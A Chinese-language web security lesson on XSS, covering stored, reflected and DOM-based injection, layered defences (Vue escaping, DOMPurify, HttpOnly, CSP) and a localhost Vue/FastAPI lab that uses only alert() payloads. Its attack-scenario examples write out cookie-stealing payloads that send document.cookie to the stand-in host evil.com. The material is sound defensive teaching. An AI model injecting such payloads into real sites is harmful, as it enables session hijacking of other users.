---
id: l-sec-xss
slug: sec-xss
title: XSS：把用户输入当代码执行的事故
difficulty: 3
estMinutes: 85
tags: [安全, 前端]
summary: 恶意脚本伪装成数据混进页面被执行——三种注入场景各配攻击剧本，防御四层（框架默认转义/输出转义/白名单过滤/CSP 兜底）各管一段，主线在本地 Vue 项目复现 onerror 注入并完成三层修复对照。
updated: 2026-11-22
resources:
  - id: r-owasp-xss
    title: OWASP · Cross Site Scripting (XSS)
    url: https://owasp.org/www-community/attacks/xss/
    type: doc
    difficulty: 3
    note: XSS 的权威分类与防御清单。
  - id: r-mdn-csp
    title: MDN · Content Security Policy（CSP）
    url: https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP
    type: doc
    difficulty: 3
    note: 纵深防御的兜底手段：限制脚本从哪来。
  - id: r-dompurify
    title: DOMPurify · GitHub 官方仓库
    url: https://github.com/cure53/DOMPurify
    type: doc
    difficulty: 3
    note: 业界标准的 HTML 白名单过滤库，富文本场景必用。
---

> 一句话定义：XSS（跨站脚本）= 攻击者把恶意脚本伪装成**数据**混进你的页面，其他用户的浏览器把它**当代码执行**——偷 Cookie、伪造操作、劫持页面全从此来。

## 概念讲解

### 本质：数据混成了代码

正常流程里，用户输入是「内容」：评论区写 `今天天气不错`，它就是要显示的一串文字。XSS 的攻击，是把输入写成**代码**：

```text
用户输入：<script>fetch('https://evil.com?c=' + document.cookie)</script>
页面渲染：<div>[用户输入原样放这里]</div>
浏览器解析：div 里出现 <script> → 按 JS 执行 → Cookie 被发往 evil.com
```

问题出在浏览器的一条老规矩上：HTML 文档里 `<script>`、`<img onerror>` 这类片段不是普通文字，而是**指令**。程序把用户输入原样嵌进 HTML，用户就能把输入「升级」成指令——**数据与代码的边界被打破，事故发生**。

这与 SQL 注入是同一类事故在不同上下文的变体，对照着记：

| | XSS | SQL 注入 |
| ---- | ---- | ---- |
| 混淆现场 | 用户数据 → HTML/JS 代码 | 用户数据 → SQL 语法 |
| 典型载荷 | `<img src=x onerror=...>` | `' OR '1'='1` |
| 直接受害者 | 浏览页面的**其他用户** | 数据库与后端数据 |
| 结构性解法 | 输出转义 / 框架插值 | 参数化查询 |
| 兜底手段 | CSP、HttpOnly | 最小权限、报错脱敏 |

对照表的意义：**解法跟着上下文走**。先识别「数据正要进入什么上下文」，再选对应武器——上下文不同，转义规则完全不同。

### 三种注入场景：数据走哪条路，事故就在哪发生

背「存储型/反射型/DOM 型」的分类没有用，理解「不可信数据走了哪条路」才有用。逐一展开：

**① 存储型（最毒）——恶意数据持久化，每个浏览者都中招**

```text
攻击剧本：
1. 攻击者在论坛发评论：<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
2. 评论作为普通文本存进数据库
3. 其他用户打开帖子 → 服务端把评论原样拼进 HTML 返回
4. 每个浏览者的浏览器执行 onerror → Cookie 静默发往 evil.com
5. 攻击者拿 Cookie 重放请求 → 冒充所有看过帖子的人登录
```

后果：不需要诱导任何人点链接，**一次投毒、全网中招**。真实事故的高发字段全是「存库后回显」的位置：评论区、昵称、个人简介、站内信。

**② 反射型（最常见）——恶意数据藏在 URL，服务器原样反射回页面**

```text
攻击剧本：
1. 站点搜索页 /search?q=xxx 把 q 回显进「您搜索了：xxx」
2. 攻击者构造：https://site.com/search?q=<img src=x onerror=...>
3. 把链接包装成「中奖通知」发给受害者
4. 受害者点击 → 恶意参数随请求发出 → 被原样嵌进响应页 → 执行
```

后果：**必须诱导点击**，攻击面依赖社工；但链接可以缩短、伪装，钓鱼邮件与群消息里极常见。渗透测试报告里的 XSS 大多属于这类。

**③ DOM 型（纯前端）——数据根本不过服务器，前端 JS 自己塞进去**

```text
攻击剧本：
1. 页面 JS 写了：box.innerHTML = location.hash.slice(1)
   （本意：把 URL 锚点内容显示出来）
2. 攻击者构造：https://site.com/page#<img src=x onerror=...>
3. # 后面的内容不会发给服务器，浏览器本地直接塞进 innerHTML
4. 执行——服务器日志里连痕迹都没有
```

后果：**纯前端事故**，后端加多少过滤都防不住它；`location.search`、`location.hash`、`localStorage` 都是它的数据源。只能靠审前端代码 + 扫描器发现。

一句话区分：**存库再回显是存储型，URL 反射回来是反射型，前端 JS 自己塞进去的是 DOM 型**。

### 防御分层：每层只防住一环

没有一招通杀，标准答案是**四层纵深**，上层失守由下层兜住：

```text
            不可信数据进入
                 │
 第 1 层 框架默认转义    Vue {{ }} / React { } 自动转义 → 防住 90% 的意外注入
 第 2 层 输出上下文转义  手写模板/旧系统按上下文转义 → 防框架盖不到的地方
 第 3 层 白名单过滤      富文本必须放行 HTML：DOMPurify 清洗 → 防合法入口被滥用
 第 4 层 CSP 兜底        限制脚本从哪来 → 前三层全失守，外链脚本也跑不起来
                 │
 （外加 HttpOnly：就算全被注入，Cookie 也偷不走）
```

| 层 | 手段 | 防住哪一环 | 防不住什么 |
| ---- | ---- | ---- | ---- |
| 1 框架默认 | `{{ }}` 插值自动转义 | 日常渲染的绝大多数注入 | `v-html` 这类显式后门 |
| 2 输出转义 | 按上下文做实体/URL 编码 | 自己拼 HTML 的旧代码 | 上下文选错的转义 |
| 3 白名单过滤 | DOMPurify / sanitize-html | 「必须放行 HTML」的富文本 | 过滤器自身的洞（选成熟库） |
| 4 CSP 兜底 | 响应头限制脚本来源 | 失守后的爆炸半径 | 被迫放宽的 inline / 三方脚本 |

关键认知：**转义让数据保持为数据，白名单决定哪些标签被允许，CSP 让注入成功的脚本跑不起来**——三层互补，生产环境全都要，不二选一。

`HttpOnly` 是第五块拼图但不属于转义层：XSS 得手的第一件事就是 `document.cookie`，让 JS 读不到它，「页面被注入」就降级为「页面被滥用」，而不是「账号被接管」。

## 代码示例

主线任务：在**本地 Vue 项目**里复现一次 `onerror` 注入（载荷只用 `alert`，无害化），再逐层修复——插值层、过滤层、兜底层各做一遍，最后实测 HttpOnly 让 Cookie「偷不到」。全程约 35 分钟。

### 第 0 步：准备受控实验环境

```bash
npm create vite@latest xss-lab -- --template vue    # 新建 Vue 项目
cd xss-lab && npm install && npm install dompurify  # 依赖 + 白名单过滤库
npm run dev                                          # 启动，浏览器打开提示的地址
```

全程只访问 `localhost`，载荷只用 `alert()`/`console.log()` 证明执行——**不要**向任何真实站点发数据；实验完可整目录删除。

### 第 1 步：漏洞版——复现 v-html 的 onerror 注入

整体替换 `src/App.vue`：

```vue
<script setup>
import { ref } from 'vue'

// 模拟「后端返回的不可信评论」——实际项目里它来自 API/数据库
const comment = ref('<img src=x onerror="alert(\'XSS！Cookie= \' + document.cookie)">')
</script>

<template>
  <h3>漏洞版</h3>
  <!-- ❌ v-html：把字符串当 HTML 解析，img 加载失败触发 onerror -->
  <div v-html="comment"></div>
</template>
```

打开页面弹出 alert = 复现成功：**你的页面替攻击者执行了代码**。真实事故里，这一步执行的就是 `fetch('https://evil.com?c='+document.cookie)`，之后攻击者拿 Cookie 冒充你登录。

### 第 2 步：修复层 1——框架默认插值（转义）

同一个模板只改一行：

```vue
<template>
  <h3>修复层 1：默认插值</h3>
  <!-- ✅ {{ }} 自动把 < > " 转成 HTML 实体，onerror 退化为普通文字 -->
  <div>{{ comment }}</div>
</template>
```

刷新页面：不再弹窗，评论**原样显示**那段代码本身——数据被关回数据的笼子。判读：框架插值是免费的防御，**日常渲染一律用它**；`v-html` 只允许出现在「内容已过白名单过滤」的位置。

### 第 3 步：修复层 2——富文本需求下的 DOMPurify 白名单过滤

产品要求评论支持加粗/链接，就必须放行 HTML——此时不是「转不转义」二选一，而是**先过滤、再渲染**：

```vue
<script setup>
import { ref, computed } from 'vue'
import DOMPurify from 'dompurify'

const raw = ref(`支持<b>加粗</b>和<a href="https://example.com">链接</a>；
但 <img src=x onerror="alert(1)"> 会被剥掉，<a href="javascript:alert(2)">伪协议链接</a> 也会被清空`)

// 白名单过滤：默认全部禁止，只放行安全标签/属性，on* 事件一律剥除
const safe = computed(() => DOMPurify.sanitize(raw.value))

// 检查过滤器到底留下了什么（输出细节随库版本略有差异，以实际打印为准）
console.log(safe.value)
</script>

<template>
  <h3>修复层 2：白名单过滤</h3>
  <!-- 此处的 v-html 是安全的：内容已被清洗 -->
  <div v-html="safe"></div>
</template>
```

预期：页面正常显示加粗与链接，`<img>` 整段消失、`javascript:` 伪协议 href 被剥掉。判读：`v-html` 本身不是错，**没过滤就 v-html 才是错**；白名单「默认全禁、显式放行」的思想，比黑名单「枚举坏标签」可靠一个量级。

### 第 4 步：修复层 3——HttpOnly 实测「偷不到」

就算某处失守，也不给攻击者留 Cookie。新建 `server.py`（`pip install fastapi uvicorn`）：

```python
# server.py —— 本地受控实验：对比普通 Cookie 与 HttpOnly Cookie
from fastapi import FastAPI, Response

app = FastAPI()

@app.get("/login")
def login(response: Response):
    # 普通 Cookie：JS 可读 → XSS 能偷
    response.set_cookie("tracker", "normal-123", samesite="lax")
    # HttpOnly：JS 读不到 → XSS 偷不走；Secure 只许 HTTPS 传输（本地 http 演示省略）
    response.set_cookie("session", "secret-456", httponly=True, samesite="lax")
    return {"msg": "cookies set"}
```

```bash
uvicorn server:app --port 8000    # 另开一个终端启动
```

浏览器访问 `http://localhost:8000/login`，回到任意页面按 F12 进 Console：

```js
document.cookie
// → "tracker=normal-123"   ← 只有它；session 因 HttpOnly 根本不出现
```

判读：XSS 得手的第一件事是读 `document.cookie`，HttpOnly 把这条路直接封死——**页面被注入 ≠ 账号被接管**。配套三件套记住：`HttpOnly`（防读）+ `Secure`（防明文传输）+ `SameSite`（防 CSRF，下一课主角）。

### 第 5 步：CSP 兜底——让注入的脚本跑不起来

新建 `csp_demo.py`，用响应头下发严格 CSP（本地演示，`evil.example` 是保留域名不会真发出请求）：

```python
# csp_demo.py —— CSP 兜底层：两种注入载荷都跑不起来
from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI()

PAGE = """
  <h3>CSP 兜底实验</h3>
  <div>模拟被注入后的 DOM：</div>
  <img src=x onerror="alert(1)">                          <!-- 内联事件 -->
  <script src="https://evil.example/x.js"></script>       <!-- 外链脚本 -->
"""

@app.get("/", response_class=HTMLResponse)
def index():
    headers = {"Content-Security-Policy": "default-src 'self'; script-src 'self'"}
    return HTMLResponse(PAGE, headers=headers)
```

```bash
uvicorn csp_demo:app --port 8001   # 访问 http://localhost:8001/，看 Console
```

预期 Console 出现两类拦截：`Refused to execute inline event handler`（严格 CSP 连内联事件处理器也拦）与 `Refused to load the script ...`（外链脚本被掐）。判读：CSP 是**兜底不是主力**——生产环境常因三方统计/旧代码被迫放宽 inline，策略一松就漏；所以转义与过滤永远是根修，CSP 负责把「万一失守」的爆炸半径压到最小。

### 三层修复对照总结

| 版本 | 关键写法 | 注入后果 |
| ---- | ---- | ---- |
| ❌ 漏洞版 | `v-html` 直接渲染不可信数据 | onerror 执行，Cookie 可被读走 |
| ✅ 修复 1 | `{{ }}` 默认插值 | 原样显示文字，不执行 |
| ✅ 修复 2 | DOMPurify 清洗后再 v-html | 富文本保留，恶意标签剥除 |
| ✅ 修复 3 | HttpOnly + CSP 兜底 | 就算失守，Cookie 偷不到、脚本跑不了 |

## 常见坑

1. **坑 1：以为「框架已转义」就万事大吉**。现象：React/Vue 项目里仍被报 XSS。原因：转义发生在**输出**环节且与上下文绑定——HTML 上下文转实体、JS 字符串转引号、URL 上下文做 URL 编码，进错上下文的转义等于没转；`v-html`/`innerHTML`/`dangerouslySetInnerHTML` 更是绕过转义的显式后门。排查：grep 三个关键词，顺着「数据 → 渲染」核对每一处的上下文与转义方式是否匹配。
2. **坑 2：富文本自己写正则过滤**。现象：正则拦了 `<script>`，仍被 `<img onerror>`、`<svg onload>`、大小写与编码变体打穿。原因：黑名单在枚举攻击手法，手法无穷无尽。排查：凡放行 HTML 的位置一律换成 DOMPurify/sanitize-html，并为其配置明确的白名单。
3. **坑 3：关键 Cookie 不设 HttpOnly**。现象：渗透报告「可窃取会话凭证」。原因：默认 Set-Cookie 对 JS 可读，注入脚本一行 `document.cookie` 即接管账号。排查：DevTools → Application → Cookies 看 HttpOnly 列；登录态等敏感 Cookie 必须为 true。
4. **坑 4：URL 参数直接进 innerHTML**。现象：分享链接带 `#关键词` 就能改页面内容。原因：`location.search`/`location.hash` 同为不可信输入，是 DOM 型 XSS 最常见来源。排查：grep `location.` 找全部赋值点，展示用 `textContent`，确需 HTML 先过滤。
5. **坑 5：把 CSP 当唯一防线**。现象：加了 CSP 就放松转义。原因：CSP 管不住被放宽的 inline 与三方域名，策略配松（`unsafe-inline` 满天飞）等于没配。排查：看 Console 的 CSP 违规报告确认策略真在拦；转义、过滤照旧全做，CSP 只做兜底。

## 小练习

1. 在 xss-lab 里分别用 `{{ }}` 与 `v-html` 渲染 `<img src=x onerror=alert(1)>`，记录两种表现，并说出各自对应防御分层的哪一层。
2. 用 DOMPurify 过滤含 `<script>`、`<img onerror>`、`<b>加粗</b>`、`<a href="javascript:alert(1)">` 的富文本，检查输出保留了什么、剥掉了什么——重点确认 javascript: 伪协议的处理方式。
3. 把第 4 步的 `tracker` Cookie 也加上 `httponly=True`，观察 `document.cookie` 返回空串；再想一步：为什么用 fetch 也读不到响应里的 Set-Cookie 头？
4. **综合修复任务**：给一个「评论列表 + 登录态」页面做安全改造——(a) 渲染层改走 DOMPurify 白名单；(b) 服务端 Set-Cookie 加 HttpOnly+Secure+SameSite；(c) 下发 CSP 头禁外链脚本；(d) 用第 1 步的载荷各跑一遍修复前后，写一份 10 行以内的对照记录。
